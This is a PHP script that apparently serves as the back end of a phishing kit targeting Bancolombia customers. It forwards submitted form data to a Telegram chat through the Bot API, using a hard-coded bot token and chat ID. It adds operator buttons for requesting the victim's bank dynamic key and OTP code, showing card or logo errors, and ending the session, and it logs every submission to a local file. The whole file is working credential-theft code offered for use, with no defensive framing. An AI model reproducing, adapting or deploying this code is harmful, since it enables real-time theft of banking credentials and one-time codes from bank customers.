<?php
$botToken = "7844799050:AAEr7wChEkAp31ktChjaTlguv1aUykSbaxw";
$chatId = "-1002658316321";

if (!isset($_POST['data'])) {
    file_put_contents("debug.log", "Falta 'data'\n", FILE_APPEND);
    exit("No se recibió 'data'");
}

$message = $_POST['data'];

// Reemplaza esto por tu lógica de ID único si lo usas
$transactionId = time() . rand(100, 999);

// Botones inline personalizados
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "🔐 Pedir Dinámica - Bancolombia", "callback_data" => "pedir_dinamica:$transactionId"]
        ],
        [
            ["text" => "📲 Pedir Código OTP", "callback_data" => "pedir_otp:$transactionId"]
        ],
        [
            ["text" => "❌ Error de TC", "callback_data" => "error_tc:$transactionId"]
        ],
        [
            ["text" => "⚠️ Error de Logo - Bancolombia", "callback_data" => "error_logo:$transactionId"]
        ],
        [
            ["text" => "✅ Finalizar", "callback_data" => "confirm_finalizar:$transactionId"]
        ]
    ]
];

// Armar payload
$postFields = [
    'chat_id' => $chatId,
    'text' => $message,
    'reply_markup' => json_encode($keyboard),
    'parse_mode' => 'HTML'
];

// Enviar con cURL
$ch = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Log para revisar si algo falla
file_put_contents("debug.log", "Enviado: $message\nRespuesta: $response\n", FILE_APPEND);
?>
